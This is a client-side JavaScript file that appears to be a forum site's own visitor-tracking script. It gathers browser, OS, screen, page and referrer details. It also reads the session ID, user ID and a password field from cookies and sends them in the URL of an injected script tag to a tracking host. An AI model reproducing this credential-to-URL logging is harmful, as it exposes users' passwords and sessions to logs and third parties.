var arr = document.cookie.split(";");
if(arr.length>50)
{
    for(var i=0,len=arr.length;i<len;i++)
    {
        var item = arr[i].split("=");
        var item0 = item[0].substring(1,13)
        if(item0 == "ASPSESSIONID") 
        { 
            delCookie(item[0]);
            // document.writeln(item[0] + "--" + item0 + "<br>");
        }
    }
}

function delCookie(name)
{
    var exp = new Date();
    exp.setTime(exp.getTime() - 1);
    document.cookie= name + "=;expires="+exp.toGMTString();
}

function GetCookieVal(offset)
{
  var endstr = document.cookie.indexOf (";", offset);
  if (endstr == -1)
  endstr = document.cookie.length;
  return document.cookie.substring(offset, endstr);
}

function GetCookie(name)
{
  var arg = name + "=";
  var alen = arg.length;
  var clen = document.cookie.length;
  var i = 0;
  while (i < clen)
  {
    var j = i + alen;
    if (document.cookie.substring(i, j) == arg)
      return GetCookieVal (j);
    i = document.cookie.indexOf(" ", i) + 1;
    if (i == 0) break;
  }
  return null;
}

var kdlog_sid = GetCookie("kd%5Fsessionid");
var kdlog_user = GetCookie("kdnet%5Fuser");
var tacd = GetCookie("tacd");
var log_user = new Array();
var U_id = 0;
var U_passwd = "";
if(kdlog_user!=null)
{
    log_user = kdlog_user.split("%2C");
    U_id = log_user[0];
    U_passwd = log_user[2];
}

var kd_s = screen.width+"*"+screen.height; 
var kd_l = window.location;
kd_l=escape(kd_l);
var kd_f = document.referrer; 
if ((kd_f == "") || (kd_f == "[unknown origin]") || (kd_f == "unknown") || (kd_f == "undefined")) 
kd_f = ""; 
kd_f = escape(kd_f);
function log_getOSVersion() {   
    var os="";   
    var userAgent = navigator.userAgent;   
// alert(userAgent);
  if (userAgent.indexOf("NT 5.1")>0) os="Windows XP";
        else if (userAgent.indexOf("Linux")>0) os="Linux";
        else if (userAgent.indexOf("NT 6.1")>0) os="Windows 2007";
        else if (userAgent.indexOf("NT 5.2")>0) os="Windows 2003";
        else if (userAgent.indexOf("Windows CE")>0) os="Windows CE";
        else if (userAgent.indexOf("NT 4.0")>0) os="Windows NT";
        else if (userAgent.indexOf("NT 5.0")>0) os="Windows 2000";
        else if (userAgent.indexOf("NT")>0) os="Windows NT";
        else if (userAgent.indexOf("Windows")>0) os="Windows";
        else if (userAgent.indexOf("9x")>0) os="Windows ME";
        else if (userAgent.indexOf("98")>0) os="Windows 98";
        else if (userAgent.indexOf("95")>0) os="Windows 95";
        else if (userAgent.indexOf("Win32")>0) os="Win32";
        else if (userAgent.indexOf("Linux")>0) os="Linux";
        else if (userAgent.indexOf("SunOS")>0) os="SunOS";
        else if (userAgent.indexOf("Mac")>0) os="Mac";
        else os="Unknow";
    return os;   
}
function log_getBrowserVersion() {   
    var browser = {};   
    var userAgent = navigator.userAgent.toLowerCase();   
    var s;   
    (s = userAgent.match(/msie ([\d.]+)/))   
            ? browser.ie = s[1]   
            : (s = userAgent.match(/firefox\/([\d.]+)/))   
                    ? browser.firefox = s[1]   
                    : (s = userAgent.match(/chrome\/([\d.]+)/))   
                            ? browser.chrome = s[1]   
                            : (s = userAgent.match(/opera.([\d.]+)/))   
                                    ? browser.opera = s[1]   
                                    : (s = userAgent   
                                            .match(/version\/([\d.]+).*safari/))   
                                            ? browser.safari = s[1]   
                                            : 0;   
    var version = "";   
    if (browser.ie) {   
        version = 'IE ' + browser.ie;   
    } else if (browser.firefox) {   
        version = 'FireFox ' + browser.firefox;   
    } else if (browser.chrome) {   
        version = 'chrome ' + browser.chrome;   
    } else if (browser.opera) {   
        version = 'opera ' + browser.opera;   
    } else if (browser.safari) {   
        version = 'safari ' + browser.safari;   
    } else {   
        version = 'Unknow';   
    }   
    return version;   
}

var kd_b = log_getBrowserVersion(); 
kd_b = escape(kd_b);

var kd_os=log_getOSVersion();
kd_os=escape(kd_os);

function tracking_log()
{
  var log_starttime = 0; 
  if(typeof(tracking_starttime)!="undefined") log_starttime=tracking_starttime;
  //var kd_out="<script src=\"//"+(location > "https" ? "track.kdnet.net" : "tracking.cat898.com")+"/about/log.php?l=" + kd_l +"&s=" +kd_s + "&f=" +kd_f  ;
  var kd_out="//"+(location > "https" ? "track.kdnet.net" : "tracking.cat898.com")+"/about/log.php?l=" + kd_l +"&s=" +kd_s + "&f=" +kd_f  ;
  kd_out=kd_out + "&sid="+kdlog_sid;
  kd_out=kd_out + "&b="+kd_b;
  kd_out=kd_out + "&o="+kd_os;
  kd_out=kd_out + "&u="+U_id;
  kd_out=kd_out + "&tacd="+tacd;
  kd_out=kd_out + "&upass="+U_passwd;
  kd_out=kd_out + "&stime="+log_starttime;
//  kd_out=kd_out +"\">";
//  kd_out=kd_out + "</scr"+"ipt>";
var $src = document.createElement('script');
$src.setAttribute('src', kd_out);
document.documentElement.appendChild($src);
//  if (location > "https") {}else{document.write (kd_out);}
}
